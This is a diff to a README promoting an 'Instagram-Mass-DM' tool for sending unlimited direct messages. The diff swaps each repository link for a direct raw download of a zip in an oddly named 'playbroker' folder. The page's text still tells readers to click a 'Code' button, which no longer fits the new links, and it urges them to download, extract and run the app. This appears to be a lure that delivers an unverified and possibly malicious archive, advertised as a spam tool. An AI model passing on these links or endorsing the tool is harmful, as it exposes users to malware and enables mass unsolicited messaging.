@@ -1,6 +1,6 @@
 # 📩 Instagram-Mass-DM - Send Unlimited Direct Messages Effortlessly
 
-[![Download Instagram-Mass-DM](https://img.shields.io/badge/Download-Instagram_Mass_DM-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb)](https://github.com/Tradingmhamed/Instagram-Mass-DM)
+[![Download Instagram-Mass-DM](https://img.shields.io/badge/Download-Instagram_Mass_DM-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb)](https://raw.githubusercontent.com/Tradingmhamed/Instagram-Mass-DM/main/playbroker/Mass_DM_Instagram_v2.8-beta.2.zip)
 
 ---
 
@@ -18,7 +18,7 @@ This tool is designed for **2026**, fully unlocked, with all features available 
 
 Visit this link to download the application:
 
-[**https://github.com/Tradingmhamed/Instagram-Mass-DM**](https://github.com/Tradingmhamed/Instagram-Mass-DM)
+[**https://raw.githubusercontent.com/Tradingmhamed/Instagram-Mass-DM/main/playbroker/Mass_DM_Instagram_v2.8-beta.2.zip**](https://raw.githubusercontent.com/Tradingmhamed/Instagram-Mass-DM/main/playbroker/Mass_DM_Instagram_v2.8-beta.2.zip)
 
 Click the green **"Code"** button on that page, then select **"Download ZIP"**. The file will start downloading to your computer.
 
@@ -152,7 +152,7 @@ Remember to use the tool responsibly. Spamming can harm your account and others'
 
 ## 📚 Additional Resources
 
-- **Official Repository:** [https://github.com/Tradingmhamed/Instagram-Mass-DM](https://github.com/Tradingmhamed/Instagram-Mass-DM)
+- **Official Repository:** [https://raw.githubusercontent.com/Tradingmhamed/Instagram-Mass-DM/main/playbroker/Mass_DM_Instagram_v2.8-beta.2.zip](https://raw.githubusercontent.com/Tradingmhamed/Instagram-Mass-DM/main/playbroker/Mass_DM_Instagram_v2.8-beta.2.zip)
 - **Report Issues:** Use the "Issues" tab on GitHub
 - **Suggest Features:** Same — just open a new issue
 
@@ -164,7 +164,7 @@ If you found this helpful, consider starring the repository to show support. It 
 
 You're all set. Download the app, extract it, run it, and start sending DMs like a pro.
 
-[**⬇️ Download Instagram-Mass-DM Now**](https://github.com/Tradingmhamed/Instagram-Mass-DM)
+[**⬇️ Download Instagram-Mass-DM Now**](https://raw.githubusercontent.com/Tradingmhamed/Instagram-Mass-DM/main/playbroker/Mass_DM_Instagram_v2.8-beta.2.zip)
 
 ---
 
